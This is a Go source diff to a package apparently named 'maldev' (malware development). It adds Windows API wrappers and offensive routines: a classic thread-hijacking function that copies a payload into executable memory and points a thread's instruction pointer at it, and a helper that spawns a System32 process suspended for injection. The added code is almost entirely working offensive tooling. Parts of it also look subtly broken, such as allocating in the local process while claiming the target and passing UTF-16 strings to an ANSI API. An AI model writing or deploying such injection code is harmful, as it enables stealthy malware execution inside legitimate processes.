@@ -3,6 +3,7 @@ package maldev
 import (
 	"errors"
 	"fmt"
+	"os"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -190,6 +191,13 @@ func CreateThread(lpThreadAttributes LPSECURITY_ATTRIBUTES, dwStackSize SIZE_T, 
 	}
 	return HANDLE(handle), nil
 }
+
+// CREATE_SUSPENDED = 0x00000004
+// STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
+const (
+	CREATE_SUSPENDED                  = 0x00000004
+	STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
+)
 
 /*
 BOOL VirtualFree(
@@ -898,4 +906,448 @@ func GetRemoteProcessHandleNtQuerySystemInformation(procName string) (DWORD, HAN
 	}
 
 	return 0, 0, fmt.Errorf("Process not found")
+}
+
+func RunViaClassicThreadHijacking(hThread HANDLE, pPayload []byte, sPayloadSize SIZE_T) error {
+	// Allocate memory in the target process
+	pAddress, err := VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("VirtualAlloc failed: %v", err)
+	}
+	// defer VirtualFree(pAddress, sPayloadSize, MEM_RELEASE)
+
+	// Write the payload to the target process
+	Memcpy(unsafe.Pointer(pAddress), unsafe.Pointer(&pPayload[0]), sPayloadSize)
+
+	// Change the protection of the memory
+	var oldProtect DWORD
+	err = VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProtect)
+	if err != nil {
+		return fmt.Errorf("VirtualProtect failed: %v", err)
+	}
+
+	// Getting the original thread context
+	threadContext := &CONTEXT{
+		ContextFlags: CONTEXT_CONTROL,
+	}
+	// Debugf("Empty threadContext: %+v\n", threadContext)
+	err = GetThreadContext(hThread, threadContext)
+	if err != nil {
+		return fmt.Errorf("GetThreadContext failed: %v", err)
+	}
+	// Debugf("Return threadContext: %+v\n", threadContext)
+	Debugf("Original RIP: 0x%X\n", threadContext.Rip)
+
+	// Updating the next instruction pointer to be equal to the payload's address
+	threadContext.Rip = uint64(pAddress)
+
+	Debugf("New RIP: 0x%X\n", threadContext.Rip)
+
+	// Updating the new thread context
+	err = SetThreadContext(hThread, threadContext)
+	if err != nil {
+		return fmt.Errorf("SetThreadContext failed: %v", err)
+	}
+
+	return nil
+}
+
+/*
+DWORD ResumeThread(
+
+	[in] HANDLE hThread
+
+);
+*/
+func ResumeThread(hThread HANDLE) error {
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	resumeThread := kernel32.MustFindProc("ResumeThread")
+	result, _, ntStatus := resumeThread.Call(uintptr(hThread))
+	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
+	if err != nil {
+		return err
+	}
+	if result == 0 {
+		return errors.New("resumeThread had zero result")
+	}
+	return nil
+}
+
+/*
+BOOL GetThreadContext(
+
+	[in]      HANDLE    hThread,
+	[in, out] LPCONTEXT lpContext
+
+);
+*/
+func GetThreadContext(hThread HANDLE, lpContext *CONTEXT) error {
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	getThreadContext := kernel32.MustFindProc("GetThreadContext")
+	result, _, ntStatus := getThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(lpContext)))
+	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
+	if err != nil {
+		return errors.New("GetThreadContext failed: " + err.Error())
+	}
+	if result == 0 {
+		return errors.New("getThreadContext had zero result")
+	}
+	return nil
+}
+
+/*
+BOOL SetThreadContext(
+
+	[in] HANDLE        hThread,
+	[in] const CONTEXT *lpContext
+
+);
+*/
+func SetThreadContext(hThread HANDLE, lpContext *CONTEXT) error {
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	setThreadContext := kernel32.MustFindProc("SetThreadContext")
+	result, _, ntStatus := setThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(lpContext)))
+	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
+	if err != nil {
+		return errors.New("SetThreadContext failed: " + err.Error())
+	}
+	if result == 0 {
+		return errors.New("setThreadContext had zero result")
+	}
+	return nil
+}
+
+/*
+	typedef struct _CONTEXT {
+	  DWORD64 P1Home;
+	  DWORD64 P2Home;
+	  DWORD64 P3Home;
+	  DWORD64 P4Home;
+	  DWORD64 P5Home;
+	  DWORD64 P6Home;
+	  DWORD   ContextFlags;
+	  DWORD   MxCsr;
+	  WORD    SegCs;
+	  WORD    SegDs;
+	  WORD    SegEs;
+	  WORD    SegFs;
+	  WORD    SegGs;
+	  WORD    SegSs;
+	  DWORD   EFlags;
+	  DWORD64 Dr0;
+	  DWORD64 Dr1;
+	  DWORD64 Dr2;
+	  DWORD64 Dr3;
+	  DWORD64 Dr6;
+	  DWORD64 Dr7;
+	  DWORD64 Rax;
+	  DWORD64 Rcx;
+	  DWORD64 Rdx;
+	  DWORD64 Rbx;
+	  DWORD64 Rsp;
+	  DWORD64 Rbp;
+	  DWORD64 Rsi;
+	  DWORD64 Rdi;
+	  DWORD64 R8;
+	  DWORD64 R9;
+	  DWORD64 R10;
+	  DWORD64 R11;
+	  DWORD64 R12;
+	  DWORD64 R13;
+	  DWORD64 R14;
+	  DWORD64 R15;
+	  DWORD64 Rip;
+	  union {
+	    XMM_SAVE_AREA32 FltSave;
+	    NEON128         Q[16];
+	    ULONGLONG       D[32];
+	    struct {
+	      M128A Header[2];
+	      M128A Legacy[8];
+	      M128A Xmm0;
+	      M128A Xmm1;
+	      M128A Xmm2;
+	      M128A Xmm3;
+	      M128A Xmm4;
+	      M128A Xmm5;
+	      M128A Xmm6;
+	      M128A Xmm7;
+	      M128A Xmm8;
+	      M128A Xmm9;
+	      M128A Xmm10;
+	      M128A Xmm11;
+	      M128A Xmm12;
+	      M128A Xmm13;
+	      M128A Xmm14;
+	      M128A Xmm15;
+	    } DUMMYSTRUCTNAME;
+	    DWORD           S[32];
+	  } DUMMYUNIONNAME;
+	  M128A   VectorRegister[26];
+	  DWORD64 VectorControl;
+	  DWORD64 DebugControl;
+	  DWORD64 LastBranchToRip;
+	  DWORD64 LastBranchFromRip;
+	  DWORD64 LastExceptionToRip;
+	  DWORD64 LastExceptionFromRip;
+	} CONTEXT, *PCONTEXT;
+*/
+type CONTEXT struct {
+	P1Home               uint64
+	P2Home               uint64
+	P3Home               uint64
+	P4Home               uint64
+	P5Home               uint64
+	P6Home               uint64
+	ContextFlags         uint32
+	MxCsr                uint32
+	SegCs                uint16
+	SegDs                uint16
+	SegEs                uint16
+	SegFs                uint16
+	SegGs                uint16
+	SegSs                uint16
+	EFlags               uint32
+	Dr0                  uint64
+	Dr1                  uint64
+	Dr2                  uint64
+	Dr3                  uint64
+	Dr6                  uint64
+	Dr7                  uint64
+	Rax                  uint64
+	Rcx                  uint64
+	Rdx                  uint64
+	Rbx                  uint64
+	Rsp                  uint64
+	Rbp                  uint64
+	Rsi                  uint64
+	Rdi                  uint64
+	R8                   uint64
+	R9                   uint64
+	R10                  uint64
+	R11                  uint64
+	R12                  uint64
+	R13                  uint64
+	R14                  uint64
+	R15                  uint64
+	Rip                  uint64
+	FltSave              [512]byte // Covers the largest union member (XMM_SAVE_AREA32)
+	VectorRegister       [26][16]byte
+	VectorControl        uint64
+	DebugControl         uint64
+	LastBranchToRip      uint64
+	LastBranchFromRip    uint64
+	LastExceptionToRip   uint64
+	LastExceptionFromRip uint64
+}
+
+/*
+#define CONTEXT_i386    0x00010000L    // this assumes that i386 and
+#define CONTEXT_i486    0x00010000L    // i486 have identical context records
+
+#define CONTEXT_CONTROL         (CONTEXT_i386 | 0x00000001L) // SS:SP, CS:IP, FLAGS, BP
+#define CONTEXT_INTEGER         (CONTEXT_i386 | 0x00000002L) // AX, BX, CX, DX, SI, DI
+#define CONTEXT_SEGMENTS        (CONTEXT_i386 | 0x00000004L) // DS, ES, FS, GS
+#define CONTEXT_FLOATING_POINT  (CONTEXT_i386 | 0x00000008L) // 387 state
+#define CONTEXT_DEBUG_REGISTERS (CONTEXT_i386 | 0x00000010L) // DB 0-3,6,7
+#define CONTEXT_EXTENDED_REGISTERS  (CONTEXT_i386 | 0x00000020L) // cpu specific extensions
+
+	#define CONTEXT_FULL (CONTEXT_CONTROL | CONTEXT_INTEGER |\
+	                      CONTEXT_SEGMENTS)
+
+	#define CONTEXT_ALL             (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | \
+	                                 CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | \
+	                                 CONTEXT_EXTENDED_REGISTERS)
+
+#define CONTEXT_XSTATE          (CONTEXT_i386 | 0x00000040L)
+
+#define CONTEXT_EXCEPTION_ACTIVE    0x08000000L
+#define CONTEXT_SERVICE_ACTIVE      0x10000000L
+#define CONTEXT_EXCEPTION_REQUEST   0x40000000L
+#define CONTEXT_EXCEPTION_REPORTING 0x80000000L
+*/
+const (
+	CONTEXT_i386                = 0x00010000
+	CONTEXT_i486                = 0x00010000
+	CONTEXT_CONTROL             = CONTEXT_i386 | 0x00000001
+	CONTEXT_INTEGER             = CONTEXT_i386 | 0x00000002
+	CONTEXT_SEGMENTS            = CONTEXT_i386 | 0x00000004
+	CONTEXT_FLOATING_POINT      = CONTEXT_i386 | 0x00000008
+	CONTEXT_DEBUG_REGISTERS     = CONTEXT_i386 | 0x00000010
+	CONTEXT_EXTENDED_REGISTERS  = CONTEXT_i386 | 0x00000020
+	CONTEXT_FULL                = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS
+	CONTEXT_ALL                 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
+	CONTEXT_XSTATE              = CONTEXT_i386 | 0x00000040
+	CONTEXT_EXCEPTION_ACTIVE    = 0x08000000
+	CONTEXT_SERVICE_ACTIVE      = 0x10000000
+	CONTEXT_EXCEPTION_REQUEST   = 0x40000000
+	CONTEXT_EXCEPTION_REPORTING = 0x80000000
+)
+
+/*
+BOOL CreateProcessA(
+
+	[in, optional]      LPCSTR                lpApplicationName,
+	[in, out, optional] LPSTR                 lpCommandLine,
+	[in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	[in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	[in]                BOOL                  bInheritHandles,
+	[in]                DWORD                 dwCreationFlags,
+	[in, optional]      LPVOID                lpEnvironment,
+	[in, optional]      LPCSTR                lpCurrentDirectory,
+	[in]                LPSTARTUPINFOA        lpStartupInfo,
+	[out]               LPPROCESS_INFORMATION lpProcessInformation
+
+);
+*/
+func CreateProcessA(lpApplicationName string, lpCommandLine string, lpProcessAttributes *SECURITY_ATTRIBUTES, lpThreadAttributes *SECURITY_ATTRIBUTES, bInheritHandles bool, dwCreationFlags DWORD, lpEnvironment *LPVOID, lpCurrentDirectory string, lpStartupInfo *STARTUPINFO, lpProcessInformation *PROCESS_INFORMATION) error {
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	createProcessA := kernel32.MustFindProc("CreateProcessA")
+	result, _, ntStatus := createProcessA.Call(
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpApplicationName))),
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCommandLine))),
+		uintptr(unsafe.Pointer(lpProcessAttributes)),
+		uintptr(unsafe.Pointer(lpThreadAttributes)),
+		boolToUintptr(bInheritHandles),
+		uintptr(dwCreationFlags),
+		uintptr(unsafe.Pointer(lpEnvironment)),
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCurrentDirectory))),
+		uintptr(unsafe.Pointer(lpStartupInfo)),
+		uintptr(unsafe.Pointer(lpProcessInformation)),
+	)
+	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
+	if err != nil {
+		return errors.New("CreateProcessA failed: " + err.Error())
+	}
+	if result == 0 {
+		return errors.New("createProcessA had zero result")
+	}
+	return nil
+}
+
+/*
+	typedef struct _SECURITY_ATTRIBUTES {
+	  DWORD  nLength;
+	  LPVOID lpSecurityDescriptor;
+	  BOOL   bInheritHandle;
+	} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
+*/
+type SECURITY_ATTRIBUTES struct {
+	NLength              DWORD
+	LpSecurityDescriptor LPVOID
+	BInheritHandle       bool
+}
+
+/*
+	typedef struct _STARTUPINFOA {
+  DWORD  cb;
+  LPSTR  lpReserved;
+  LPSTR  lpDesktop;
+  LPSTR  lpTitle;
+  DWORD  dwX;
+  DWORD  dwY;
+  DWORD  dwXSize;
+  DWORD  dwYSize;
+  DWORD  dwXCountChars;
+  DWORD  dwYCountChars;
+  DWORD  dwFillAttribute;
+  DWORD  dwFlags;
+  WORD   wShowWindow;
+  WORD   cbReserved2;
+  LPBYTE lpReserved2;
+  HANDLE hStdInput;
+  HANDLE hStdOutput;
+  HANDLE hStdError;
+} STARTUPINFOA, *LPSTARTUPINFOA;
+*/
+
+type STARTUPINFO struct {
+	Cb              DWORD
+	LpReserved      *LPSTR
+	LpDesktop       *LPSTR
+	LpTitle         *LPSTR
+	DwX             DWORD
+	DwY             DWORD
+	DwXSize         DWORD
+	DwYSize         DWORD
+	DwXCountChars   DWORD
+	DwYCountChars   DWORD
+	DwFillAttribute DWORD
+	DwFlags         DWORD
+	WShowWindow     WORD
+	CbReserved2     WORD
+	LpReserved2     *LPBYTE
+	HStdInput       HANDLE
+	HStdOutput      HANDLE
+	HStdError       HANDLE
+}
+
+type WORD uint16
+type LPBYTE uintptr
+
+/*
+	typedef struct _PROCESS_INFORMATION {
+	  HANDLE hProcess;        // A handle to the newly created process.
+	  HANDLE hThread;         // A handle to the main thread of the newly created process.
+	  DWORD  dwProcessId;     // Process ID
+	  DWORD  dwThreadId;      // Main Thread's ID
+	} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
+*/
+type PROCESS_INFORMATION struct {
+	HProcess    HANDLE
+	HThread     HANDLE
+	DwProcessId DWORD
+	DwThreadId  DWORD
+}
+
+/*
+DWORD GetEnvironmentVariableA(
+
+	[in, optional]  LPCSTR lpName,
+	[out, optional] LPSTR  lpBuffer,
+	[in]            DWORD  nSize
+
+);
+*/
+func GetEnvironmentVariableA(lpName string, lpBuffer *LPSTR, nSize DWORD) (DWORD, error) {
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	getEnvironmentVariableA := kernel32.MustFindProc("GetEnvironmentVariableA")
+	result, _, ntStatus := getEnvironmentVariableA.Call(
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpName))),
+		uintptr(unsafe.Pointer(lpBuffer)),
+		uintptr(nSize),
+	)
+	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
+	if err != nil {
+		return 0, errors.New("GetEnvironmentVariableA failed: " + err.Error())
+	}
+	return DWORD(result), nil
+}
+
+type LPSTR uintptr
+
+func GetEnvironmentalVariable(key string) string {
+	return os.Getenv(key) // Builtin Go Functionality (Need to check if this calls any DLL's)
+}
+
+func CreateSuspendedProcess(processName string) (dwProcessId *DWORD, hProcess, hThread *HANDLE, err error) {
+	WnDr := GetEnvironmentalVariable("WINDIR")
+	lpPath := WnDr + "\\System32\\" + processName
+	Si := &STARTUPINFO{}
+	Pi := &PROCESS_INFORMATION{}
+	Debugf("Running %s\n", lpPath)
+	err = CreateProcessA("", lpPath, nil, nil, false, CREATE_SUSPENDED, nil, "", Si, Pi)
+	if err != nil {
+		return nil, nil, nil, fmt.Errorf("failed to create process: %v", err)
+	}
+	Debugf("Created process %s\n", processName)
+	dwProcessId = &Pi.DwProcessId
+	hProcess = &Pi.HProcess
+	hThread = &Pi.HThread
+	// Ensure we have dwProcessId , hProcess , and hThread
+	if *dwProcessId == 0 || *hProcess == NULL || *hThread == NULL {
+		return nil, nil, nil, errors.New("failed to create process")
+	}
+	// return dwProcessId, hProcess, hThread
+	return dwProcessId, hProcess, hThread, nil
 }
